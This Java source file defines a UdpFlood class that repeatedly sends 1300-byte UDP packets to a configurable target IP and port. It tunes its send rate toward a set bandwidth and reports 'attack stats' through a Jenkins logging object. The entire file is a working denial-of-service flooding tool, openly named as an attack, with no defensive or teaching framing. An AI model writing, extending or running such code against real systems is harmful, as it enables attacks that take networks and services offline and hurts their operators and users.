package com.yourpackage;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.concurrent.atomic.AtomicLong;

public class UdpFlood {
    private volatile boolean stopAttack = false;
    private final String targetIp;
    private final int targetPort;
    private final long bytesPerSecond;
    private final AtomicLong totalPacketsSent = new AtomicLong(0);
    private long startTime;
    private static final int PACKET_SIZE = 1300;
    private long lastLogTime = System.currentTimeMillis();

    public UdpFlood(String targetIp, int targetPort, long bytesPerSecond) {
        this.targetIp = targetIp;
        this.targetPort = targetPort;
        this.bytesPerSecond = bytesPerSecond;
        this.startTime = System.nanoTime();
    }

    public void start() {
        try (DatagramSocket socket = new DatagramSocket()) {
            InetAddress address = InetAddress.getByName(targetIp);
            byte[] buffer = new byte[PACKET_SIZE];
            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);
            startTime = System.nanoTime();
            
            long packetsSent = 0;
            long packetsToSendPerCheck = bytesPerSecond / PACKET_SIZE;
            startTime = System.nanoTime();

            while (!stopAttack) {
                for (int i = 0; i < packetsToSendPerCheck && !stopAttack; i++) {
                    socket.send(packet);
                    packetsSent++;
                    totalPacketsSent.incrementAndGet();
                }

                long currentTime = System.nanoTime();
                double elapsedSeconds = (currentTime - startTime) / 1_000_000_000.0;
                
                if (elapsedSeconds >= 0.1) {
                    double currentRate = (packetsSent * PACKET_SIZE * 8.0) / (elapsedSeconds * 1_000_000);
                    double targetRate = (bytesPerSecond * 8.0) / 1_000_000;

                    if (currentRate < targetRate * 0.95) {
                        packetsToSendPerCheck = (long)(packetsToSendPerCheck * 1.1);
                    } else if (currentRate > targetRate * 1.05) {
                        packetsToSendPerCheck = (long)(packetsToSendPerCheck * 0.9);
                    }

                    packetsSent = 0;
                    startTime = currentTime;
                }

                // Add small sleep to prevent CPU overload
                Thread.sleep(1);
            }
        } catch (Exception e) {
            // Handle error
        }
    }

    public void stop() {
        stopAttack = true;
    }

    public void updateStats(Jenkins jenkins) {
        long currentPacketCount = totalPacketsSent.get();
        double currentRate = (currentPacketCount * PACKET_SIZE * 8.0) / 
            ((System.nanoTime() - startTime) / 1_000_000_000.0) / 1_000_000;
        double targetRate = (bytesPerSecond * 8.0) / 1_000_000;
        double totalDataSent = currentPacketCount * PACKET_SIZE;
        
        jenkins.logAttackStats("UDP", targetIp, currentRate, targetRate, currentPacketCount, totalDataSent);
    }
} 